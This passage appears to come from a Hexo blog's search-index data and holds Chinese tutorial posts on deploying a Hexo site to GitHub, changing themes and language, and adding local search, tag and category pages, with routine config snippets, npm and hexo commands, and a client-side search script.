class=\"line\">sudo npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>\n<p><img src=\"Pog-PLHcf3Aq0PF995VZXKmcj-TG232MclF1K0vCKXA.png\" alt=\"image\"></p>\n<p>安装完成 git 部署插件后，需要设置下 blogs文件夹下的 _config.yml 这个文件</p>\n<p>修改文件的 Deployment 部分,</p>\n<p>安装完成上述的deployer-git插件之后，设置项目文件夹下的_config.yml 文件</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">deploy:</span><br><span class=\"line\">  type: <span class=\"string\">&#x27;git&#x27;</span></span><br><span class=\"line\">  repo: https:<span class=\"comment\">//github.com/Garckz/Garckz.github.io</span></span><br><span class=\"line\">  branch: master</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">新版本写法：</span><br><span class=\"line\">branch需要使用mian</span><br><span class=\"line\"></span><br><span class=\"line\">SSH写法：</span><br><span class=\"line\">deploy:</span><br><span class=\"line\">  type: <span class=\"string\">&#x27;git&#x27;</span></span><br><span class=\"line\">  repo: git<span class=\"meta\">@github</span>.com:Garckz/Garckz.github.io.git</span><br><span class=\"line\">  branch: main</span><br></pre></td></tr></table></figure>\n<p><img src=\"LrR_MSFKobBTeJlV3KL918TSypDaSe0lAUh77Y-vgp0.png\" alt=\"image\"></p>\n<p><strong>切记：分支branch切记修改为 main，之前github的默认主分支为master，现已经改为main</strong> ！！！</p>\n<h3 id=\"上传到Github\"><a href=\"#上传到Github\" class=\"headerlink\" title=\"上传到Github\"></a>上传到Github</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 清理</span><br><span class=\"line\">hexo clean</span><br><span class=\"line\"># 构建静态文件</span><br><span class=\"line\">hexo g</span><br><span class=\"line\"># 上传到仓库</span><br><span class=\"line\">hexo d</span><br></pre></td></tr></table></figure>\n<p><img src=\"nMpLWIMDazitLVGFeolbJPbfyNlO3_uxV6_A17cZKPY.png\" alt=\"image\"></p>\n<h2 id=\"将博客部署到Gitee上\"><a href=\"#将博客部署到Gitee上\" class=\"headerlink\" title=\"将博客部署到Gitee上\"></a>将博客部署到Gitee上</h2><h3 id=\"新建仓库-1\"><a href=\"#新建仓库-1\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3><p>在Gitee上新建一个用来存放博客的仓库，此处需要特别注意路径的填写。</p>\n<p><img src=\"KHyjTbtqtZOVzQr1e2aluRYqGRh9hawoLDSAwG7YmQ0.png\" alt=\"image\"></p>\n<p>需要实名验证，所以就不用这个做了，很麻烦。</p>\n","categories":["Hexo"],"tags":["Hexo"]},{"title":"搭建Hexo博客进阶","url":"/2020/02/29/%E6%90%AD%E5%BB%BAHexo%E5%8D%9A%E5%AE%A2%E8%BF%9B%E9%98%B6/","content":"<h1 id=\"搭建Hexo博客进阶\"><a href=\"#搭建Hexo博客进阶\" class=\"headerlink\" title=\"搭建Hexo博客进阶\"></a>搭建Hexo博客进阶</h1><h2 id=\"更换模板\"><a href=\"#更换模板\" class=\"headerlink\" title=\"更换模板\"></a>更换模板</h2><p>到themes目录下，下载自己喜欢主题模板</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/probberechts/hexo-theme-cactus.git</span><br></pre></td></tr></table></figure>\n<p>在项目的_config.yml文件中进行更换主题</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">theme: hexo-theme-cactus</span><br></pre></td></tr></table></figure>\n<p>在项目目录下，打开git bash，输入以下命令，清除缓存，生成静态文件，查看效果</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo clean</span><br><span class=\"line\">hexo g</span><br><span class=\"line\">hexo s  <span class=\"comment\">#相当于 启动服务 hexo server</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"新建一个导航栏的项\"><a href=\"#新建一个导航栏的项\" class=\"headerlink\" title=\"新建一个导航栏的项\"></a>新建一个导航栏的项</h2><p>在.&#x2F;themes&#x2F;cactus&#x2F;_config.yml找到nav</p>\n<p><img src=\"C-a5CXYmE9OHOUAtBMIgp_FvbBJmTlQW6DqHBr2Sf7o.png\" alt=\"image\"></p>\n<p><img src=\"Nb5nWx1QkeQdj5eanykeR44MqMoc4Mp-Zr4Skuk_I7A.png\" alt=\"image\"></p>\n<h2 id=\"更换语言类型\"><a href=\"#更换语言类型\" class=\"headerlink\" title=\"更换语言类型\"></a>更换语言类型</h2><p>更换项目的_config.yml 为下面的内容即可</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Site</span></span><br><span class=\"line\">title: 兀自</span><br><span class=\"line\">subtitle: <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">description: <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">keywords:</span><br><span class=\"line\">author: Garckz</span><br><span class=\"line\">language: zh-CN</span><br><span class=\"line\">timezone: <span class=\"string\">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"修改欢迎页面的内容\"><a href=\"#修改欢迎页面的内容\" class=\"headerlink\" title=\"修改欢迎页面的内容\"></a>修改欢迎页面的内容</h2><p>先查看你language用的语言模板，这里是：zh-CN</p>\n<p>所以修改主题文件夹下面的language文件下面的zh-CN.yml文件的内容即可。</p>\n<h2 id=\"添加搜索-XML\"><a href=\"#添加搜索-XML\" class=\"headerlink\" title=\"添加搜索(XML)\"></a>添加搜索(XML)</h2><p>先在在.&#x2F;themes&#x2F;cactus&#x2F;_config.yml找到nav添加一个标签。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">nav:</span><br><span class=\"line\">  home: /</span><br><span class=\"line\">  about: /about/</span><br><span class=\"line\">  articles: /archives/</span><br><span class=\"line\">  projects: http://github.com/probberechts</span><br><span class=\"line\">  search: /search/</span><br></pre></td></tr></table></figure>\n<p>用到了 <a href=\"https://github.com/wzpan/hexo-generator-search\" title=\"hexo-generator-search\">hexo-generator-search</a> 的 Hexo 插件来做内容搜索，安装命令如下</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>\n<p><img src=\"A_G15Imlu2VdAlS_XN-XiIyTocPIenmtwXRqJwje_pM.png\" alt=\"image\"></p>\n<p>执行下面命令创建一个</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo new page search</span><br></pre></td></tr></table></figure>\n<p>进入项目地址下的source&#x2F;search&#x2F;index.md，修改md文件的头为</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">title: Search</span><br><span class=\"line\"><span class=\"built_in\">type</span>: search</span><br><span class=\"line\">---</span><br></pre></td></tr></table></figure>\n<p><img src=\"uP6XsJwwD34izTmKUtWbOB8jrWpXSv00OmjGd2f6a6Y.png\" alt=\"image\"></p>\n<p>出现页面之后，搜索到的内容不可以超链接点过去访问，这时候需要进行以下的配置。</p>\n<p><strong>配置1</strong></p>\n<p>在项目下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#Search</span></span><br><span class=\"line\"><span class=\"attr\">search:</span></span><br><span class=\"line\">  <span class=\"attr\">path:</span> <span class=\"string\">search.xml</span></span><br><span class=\"line\">  <span class=\"attr\">field:</span> <span class=\"string\">post</span></span><br><span class=\"line\">  <span class=\"attr\">content:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  <span class=\"attr\">format:</span> <span class=\"string\">html</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"KUhFEBqwSuss11_P-eGBshQhrbDC2W5_BWp0MMtB65I.png\" alt=\"image\"></p>\n<ul>\n<li><p>path：表示搜索后生成的文件路径，可以生成xml和json两种格式。</p>\n</li>\n<li><p>field：表示搜索的范围，有“​​post、page和all​​”三种值。</p>\n</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">post：所有的文章；</span><br><span class=\"line\">page：所有顶部导航选项的页面；</span><br><span class=\"line\">all：所有的文章和顶部导航选项的页面。</span><br></pre></td></tr></table></figure>\n<ul>\n<li>content：是否包含搜索到的文章的全部内容。如果false，生成的结果只包括标题和创建时间这些信息，没有文章主体。默认情况下是true.</li>\n<li>format：搜索到的内容、选项的格式。</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">html(默认)：将html原文本缩略。</span><br><span class=\"line\">striptags：将html原文本缩略，并删除所有标记。</span><br><span class=\"line\">raw：记下每一篇文章或每一页的文字。</span><br></pre></td></tr></table></figure>\n\n\n<p><strong>配置2</strong></p>\n<p>主题文件下_config.yml文件添加下面的内容</p>\n<p> all：所有的文章和顶部导航选项的页面。</p>\n<p><img src=\"DrgbW9P7qj4biCTE_A4c6ObM-l6QlTw4E_tkh3PLgMI.png\" alt=\"image\"></p>\n<h2 id=\"添加搜索（JSON）\"><a href=\"#添加搜索（JSON）\" class=\"headerlink\" title=\"添加搜索（JSON）\"></a>添加搜索（JSON）</h2><p>上面我们使用.xml的方式做搜索。偶时候链接错误，出现undefined。</p>\n<p>网上的说法是：某些文章有格式问题，导致生成的search.xml也出错了。</p>\n<p>下面我们使用json格式的方式来实现该功能。</p>\n<h3 id=\"第一步\"><a href=\"#第一步\" class=\"headerlink\" title=\"第一步\"></a>第一步</h3><p>在项目的_config.yml文件中把search.xml修改为search.json</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">原本：</span><br><span class=\"line\">search:</span><br><span class=\"line\">  path: search.xml</span><br><span class=\"line\">  field: post</span><br><span class=\"line\"></span><br><span class=\"line\">修改为：</span><br><span class=\"line\">search:</span><br><span class=\"line\">  path: search.json</span><br><span class=\"line\">  field: post</span><br></pre></td></tr></table></figure>\n<h3 id=\"第二步\"><a href=\"#第二步\" class=\"headerlink\" title=\"第二步\"></a>第二步</h3><p>找到主题的search.ejs模板文件，我这里的路径是：themes&#x2F;hexo-theme-cactus&#x2F;layout&#x2F;_partial&#x2F;search.ejs</p>\n<p>我这里的这个主题不需要修改。其它主题的修改方式：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script <span class=\"built_in\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span>&gt;</span><br><span class=\"line\">$(<span class=\"function\"><span class=\"title\">function</span></span> () &#123;</span><br><span class=\"line\">    console.log(<span class=\"string\">&quot;lets go！&quot;</span>);</span><br><span class=\"line\">    console.log(<span class=\"string\">&quot;&lt;%= config.root %&gt;&quot;</span>);</span><br><span class=\"line\">    searchFunc(<span class=\"string\">&quot;&lt;%= config.root %&gt;&quot;</span> + <span class=\"string\">&quot;search.xml&quot;</span>, <span class=\"string\">&#x27;searchInput&#x27;</span>, <span class=\"string\">&#x27;searchResult&#x27;</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>修改为：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script <span class=\"built_in\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span>&gt;</span><br><span class=\"line\">$(<span class=\"function\"><span class=\"title\">function</span></span> () &#123;</span><br><span class=\"line\">    console.log(<span class=\"string\">&quot;lets go！&quot;</span>);</span><br><span class=\"line\">    console.log(<span class=\"string\">&quot;&lt;%= config.root %&gt;&quot;</span>);</span><br><span class=\"line\">    searchFunc(<span class=\"string\">&quot;&lt;%= config.root %&gt;&quot;</span> + <span class=\"string\">&quot;search.json&quot;</span>, <span class=\"string\">&#x27;searchInput&#x27;</span>, <span class=\"string\">&#x27;searchResult&#x27;</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"最后一步\"><a href=\"#最后一步\" class=\"headerlink\" title=\"最后一步\"></a>最后一步</h3><p>修改你的search的本地js文件，我这里的路径是：themes&#x2F;hexo-theme-cactus&#x2F;source&#x2F;js&#x2F;search.js</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">原本：</span><br><span class=\"line\">    dataType: <span class=\"string\">&quot;xml&quot;</span>,</span><br><span class=\"line\">    success: <span class=\"keyword\">function</span>(xmlResponse) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">修改为：</span><br><span class=\"line\">    dataType: <span class=\"string\">&quot;json&quot;</span>,</span><br><span class=\"line\">    success: <span class=\"keyword\">function</span>(datas) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">还需要注释掉：</span><br><span class=\"line\">      // get the contents from search data</span><br><span class=\"line\">      // var datas = $(<span class=\"string\">&quot;entry&quot;</span>, xmlResponse).map(<span class=\"function\"><span class=\"title\">function</span></span>() &#123;</span><br><span class=\"line\">      //   <span class=\"built_in\">return</span> &#123;</span><br><span class=\"line\">      //     title: $(<span class=\"string\">&quot;title&quot;</span>, this).text(),</span><br><span class=\"line\">      //     content: $(<span class=\"string\">&quot;content&quot;</span>, this).text(),</span><br><span class=\"line\">      //     url: $(<span class=\"string\">&quot;link&quot;</span>, this).attr(<span class=\"string\">&quot;href&quot;</span>)</span><br><span class=\"line\">      //   &#125;;</span><br><span class=\"line\">      // &#125;).get();</span><br></pre></td></tr></table></figure>\n<p>最终结果为：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">// A <span class=\"built_in\">local</span> search script with the <span class=\"built_in\">help</span> of</span><br><span class=\"line\">// [hexo-generator-search](https://github.com/PaicHyperionDev/hexo-generator-search)</span><br><span class=\"line\">// Copyright (C) 2015</span><br><span class=\"line\">// Joseph Pan &lt;http://github.com/wzpan&gt;</span><br><span class=\"line\">// Shuhao Mao &lt;http://github.com/maoshuhao&gt;</span><br><span class=\"line\">// This library is free software; you can redistribute it and/or modify</span><br><span class=\"line\">// it under the terms of the GNU Lesser General Public License as</span><br><span class=\"line\">// published by the Free Software Foundation; either version 2.1 of the</span><br><span class=\"line\">// License, or (at your option) any later version.</span><br><span class=\"line\">//</span><br><span class=\"line\">// This library is distributed <span class=\"keyword\">in</span> the hope that it will be useful, but</span><br><span class=\"line\">// WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class=\"line\">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU</span><br><span class=\"line\">// Lesser General Public License <span class=\"keyword\">for</span> more details.</span><br><span class=\"line\">//</span><br><span class=\"line\">// You should have received a copy of the GNU Lesser General Public</span><br><span class=\"line\">// License along with this library; <span class=\"keyword\">if</span> not, write to the Free Software</span><br><span class=\"line\">// Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA</span><br><span class=\"line\">// 02110-1301 USA</span><br><span class=\"line\">//</span><br><span class=\"line\">// Modified by:</span><br><span class=\"line\">// Pieter Robberechts &lt;http://github.com/probberechts&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">/*exported searchFunc*/</span><br><span class=\"line\">var searchFunc = <span class=\"keyword\">function</span>(path, searchId, contentId) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">function</span> stripHtml(html) &#123;</span><br><span class=\"line\">    html = html.replace(/&lt;style([\\s\\S]*?)&lt;\\/style&gt;/gi, <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;script([\\s\\S]*?)&lt;\\/script&gt;/gi, <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;figure([\\s\\S]*?)&lt;\\/figure&gt;/gi, <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;\\/div&gt;/ig, <span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;\\/li&gt;/ig, <span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;li&gt;/ig, <span class=\"string\">&quot;  *  &quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;\\/ul&gt;/ig, <span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;\\/p&gt;/ig, <span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;br\\s*[\\/]?&gt;/gi, <span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;[^&gt;]+&gt;/ig, <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">return</span> html;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">function</span> getAllCombinations(keywords) &#123;</span><br><span class=\"line\">    var i, j, result = [];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = 0; i &lt; keywords.length; i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (j = i + 1; j &lt; keywords.length + 1; j++) &#123;</span><br><span class=\"line\">            result.push(keywords.slice(i, j).<span class=\"built_in\">join</span>(<span class=\"string\">&quot; &quot;</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">return</span> result;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  $.ajax(&#123;</span><br><span class=\"line\">    url: path,</span><br><span class=\"line\">    // dataType: <span class=\"string\">&quot;xml&quot;</span>,</span><br><span class=\"line\">    dataType: <span class=\"string\">&quot;json&quot;</span>,</span><br><span class=\"line\">    //success: <span class=\"keyword\">function</span>(xmlResponse) &#123;</span><br><span class=\"line\">    success: <span class=\"keyword\">function</span>(datas) &#123;</span><br><span class=\"line\">      // get the contents from search data</span><br><span class=\"line\">      // var datas = $(<span class=\"string\">&quot;entry&quot;</span>, xmlResponse).map(<span class=\"function\"><span class=\"title\">function</span></span>() &#123;</span><br><span class=\"line\">      //   <span class=\"built_in\">return</span> &#123;</span><br><span class=\"line\">      //     title: $(<span class=\"string\">&quot;title&quot;</span>, this).text(),</span><br><span class=\"line\">      //     content: $(<span class=\"string\">&quot;content&quot;</span>, this).text(),</span><br><span class=\"line\">      //     url: $(<span class=\"string\">&quot;link&quot;</span>, this).attr(<span class=\"string\">&quot;href&quot;</span>)</span><br><span class=\"line\">      //   &#125;;</span><br><span class=\"line\">      // &#125;).get();</span><br><span class=\"line\"></span><br><span class=\"line\">      var <span class=\"variable\">$input</span> = document.getElementById(searchId);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!<span class=\"variable\">$input</span>) &#123; <span class=\"built_in\">return</span>; &#125;</span><br><span class=\"line\">      var <span class=\"variable\">$resultContent</span> = document.getElementById(contentId);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"variable\">$input</span>.addEventListener(<span class=\"string\">&quot;input&quot;</span>, <span class=\"function\"><span class=\"title\">function</span></span>()&#123;</span><br><span class=\"line\">        var resultList = [];</span><br><span class=\"line\">        var keywords = getAllCombinations(this.value.trim().toLowerCase().<span class=\"built_in\">split</span>(<span class=\"string\">&quot; &quot;</span>))</span><br><span class=\"line\">          .<span class=\"built_in\">sort</span>(<span class=\"keyword\">function</span>(a,b) &#123; <span class=\"built_in\">return</span> b.split(<span class=\"string\">&quot; &quot;</span>).length - a.split(<span class=\"string\">&quot; &quot;</span>).length; &#125;);</span><br><span class=\"line\">        <span class=\"variable\">$resultContent</span>.innerHTML = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (this.value.trim().length &lt;= 0) &#123;</span><br><span class=\"line\">          <span class=\"built_in\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        // perform <span class=\"built_in\">local</span> searching</span><br><span class=\"line\">        datas.forEach(<span class=\"keyword\">function</span>(data) &#123;</span><br><span class=\"line\">          var matches = 0;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (!data.title || data.title.trim() === <span class=\"string\">&quot;&quot;</span>) &#123;</span><br><span class=\"line\">            data.title = <span class=\"string\">&quot;Untitled&quot;</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          var dataTitle = data.title.trim().toLowerCase();</span><br><span class=\"line\">          var dataTitleLowerCase = dataTitle.toLowerCase();</span><br><span class=\"line\">          var dataContent = stripHtml(data.content.trim());</span><br><span class=\"line\">          var dataContentLowerCase = dataContent.toLowerCase();</span><br><span class=\"line\">          var dataUrl = data.url;</span><br><span class=\"line\">          var indexTitle = -1;</span><br><span class=\"line\">          var indexContent = -1;</span><br><span class=\"line\">          var firstOccur = -1;</span><br><span class=\"line\">          // only match artiles with not empty contents</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (dataContent !== <span class=\"string\">&quot;&quot;</span>) &#123;</span><br><span class=\"line\">            keywords.forEach(<span class=\"keyword\">function</span>(keyword) &#123;</span><br><span class=\"line\">              indexTitle = dataTitleLowerCase.indexOf(keyword);</span><br><span class=\"line\">              indexContent = dataContentLowerCase.indexOf(keyword);</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"keyword\">if</span>( indexTitle &gt;= 0 || indexContent &gt;= 0 )&#123;</span><br><span class=\"line\">                matches += 1;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (indexContent &lt; 0) &#123;</span><br><span class=\"line\">                  indexContent = 0;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (firstOccur &lt; 0) &#123;</span><br><span class=\"line\">                  firstOccur = indexContent;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          // show search results</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (matches &gt; 0) &#123;</span><br><span class=\"line\">            var searchResult = &#123;&#125;;</span><br><span class=\"line\">            searchResult.rank = matches;</span><br><span class=\"line\">            searchResult.str = <span class=\"string\">&quot;&lt;li&gt;&lt;a href=&#x27;&quot;</span>+ dataUrl +<span class=\"string\">&quot;&#x27; class=&#x27;search-result-title&#x27;&gt;&quot;</span>+ dataTitle +<span class=\"string\">&quot;&lt;/a&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (firstOccur &gt;= 0) &#123;</span><br><span class=\"line\">              // <span class=\"built_in\">cut</span> out 100 characters</span><br><span class=\"line\">              var start = firstOccur - 20;</span><br><span class=\"line\">              var end = firstOccur + 80;</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"keyword\">if</span>(start &lt; 0)&#123;</span><br><span class=\"line\">                start = 0;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"keyword\">if</span>(start == 0)&#123;</span><br><span class=\"line\">                end = 100;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"keyword\">if</span>(end &gt; dataContent.length)&#123;</span><br><span class=\"line\">                end = dataContent.length;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">              var matchContent = dataContent.substring(start, end);</span><br><span class=\"line\"></span><br><span class=\"line\">              // highlight all keywords</span><br><span class=\"line\">              var regS = new RegExp(keywords.join(<span class=\"string\">&quot;|&quot;</span>), <span class=\"string\">&quot;gi&quot;</span>);</span><br><span class=\"line\">              matchContent = matchContent.replace(regS, <span class=\"keyword\">function</span>(keyword) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">return</span> <span class=\"string\">&quot;&lt;em class=\\&quot;search-keyword\\&quot;&gt;&quot;</span>+keyword+<span class=\"string\">&quot;&lt;/em&gt;&quot;</span>;</span><br><span class=\"line\">              &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">              searchResult.str += <span class=\"string\">&quot;&lt;p class=\\&quot;search-result\\&quot;&gt;&quot;</span> + matchContent +<span class=\"string\">&quot;...&lt;/p&gt;&quot;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            searchResult.str += <span class=\"string\">&quot;&lt;/li&gt;&quot;</span>;</span><br><span class=\"line\">            resultList.push(searchResult);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (resultList.length) &#123;</span><br><span class=\"line\">          resultList.<span class=\"built_in\">sort</span>(<span class=\"keyword\">function</span>(a, b) &#123;</span><br><span class=\"line\">              <span class=\"built_in\">return</span> b.rank - a.rank;</span><br><span class=\"line\">          &#125;);</span><br><span class=\"line\">          var result =<span class=\"string\">&quot;&lt;ul class=\\&quot;search-result-list\\&quot;&gt;&quot;</span>;</span><br><span class=\"line\">          <span class=\"keyword\">for</span> (var i = 0; i &lt; resultList.length; i++) &#123;</span><br><span class=\"line\">            result += resultList[i].str;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          result += <span class=\"string\">&quot;&lt;/ul&gt;&quot;</span>;</span><br><span class=\"line\">          <span class=\"variable\">$resultContent</span>.innerHTML = result;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n<p>最终项目的_config.yml</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">search:</span><br><span class=\"line\">  path: search.json</span><br><span class=\"line\">  field: post</span><br><span class=\"line\">  content: <span class=\"literal\">true</span></span><br><span class=\"line\">  format: html</span><br><span class=\"line\">  <span class=\"built_in\">limit</span>: 10000</span><br></pre></td></tr></table></figure>\n<p>最终主题的_config.yml</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">local_search:</span><br><span class=\"line\">  <span class=\"built_in\">enable</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">  <span class=\"comment\"># auto表示改变输入就自动触发搜索</span></span><br><span class=\"line\">  <span class=\"comment\"># manual表示按下回车键或搜索按钮才触发搜索</span></span><br><span class=\"line\">  trigger: auto</span><br><span class=\"line\">  <span class=\"comment\"># 这里的数字n表示显示每篇文章搜索到的n个结果</span></span><br><span class=\"line\">  <span class=\"comment\"># -1表示显示每篇文章搜索到的全部结果(不建议)</span></span><br><span class=\"line\">  top_n_per_article: 1</span><br></pre></td></tr></table></figure>\n<h2 id=\"添加标签页\"><a href=\"#添加标签页\" class=\"headerlink\" title=\"添加标签页\"></a>添加标签页</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo new page tags</span><br></pre></td></tr></table></figure>\n<p><img src=\"h1edlshktmHLnU9E-Xc1KebtW5e99chfzA5x7te3wSk.png\" alt=\"image\"></p>\n<p>根据上面的路径，找到index.md这个文件</p>\n<p>添加type: “tags” layout: “tags”到内容中，添加后是这样的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">title: tags</span><br><span class=\"line\"><span class=\"built_in\">date</span>: 2023-04-29 21:30:23</span><br><span class=\"line\"><span class=\"built_in\">type</span>: <span class=\"string\">&quot;tags&quot;</span></span><br><span class=\"line\">layout: <span class=\"string\">&quot;tags&quot;</span></span><br><span class=\"line\">---</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"标签页实现标签云效果\"><a href=\"#标签页实现标签云效果\" class=\"headerlink\" title=\"标签页实现标签云效果\"></a>标签页实现标签云效果</h3><p>安装插件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install hexo-tag-cloud  --save</span><br></pre></td></tr></table></figure>\n<p>找到 tagcloud.ejs 文件，完整路径：</p>\n<p>修改为以下内容：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"文章添加标签\"><a href=\"#文章添加标签\" class=\"headerlink\" title=\"文章添加标签\"></a>文章添加标签</h3><p>在每篇文章的头部添加</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">title: Tags and Categories</span><br><span class=\"line\"><span class=\"built_in\">date</span>: 2017-12-24 23:29:53</span><br><span class=\"line\">tags:</span><br><span class=\"line\">- Foo</span><br><span class=\"line\">- Bar</span><br></pre></td></tr></table></figure>\n<p><img src=\"RXQ6UuEFKLy3acWISocGXpbos58iF4Oyf40e6MiOpm0.png\" alt=\"image\"></p>\n<h2 id=\"新分类页\"><a href=\"#新分类页\" class=\"headerlink\" title=\"新分类页\"></a>新分类页</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo new page categories</span><br></pre></td></tr></table></figure>\n<p>添加下面内容</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">title: categories</span><br><span class=\"line\"><span class=\"built_in\">date</span>: 2023-04-29 23:32:13</span><br><span class=\"line\"><span class=\"built_in\">type</span>: <span class=\"string\">&quot;categories&quot;</span></span><br><span class=\"line\">comments: <span class=\"literal\">false</span></span><br><span class=\"line\">---</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><strong>type</strong> 字段用来指定页面类型，<strong>comments</strong> 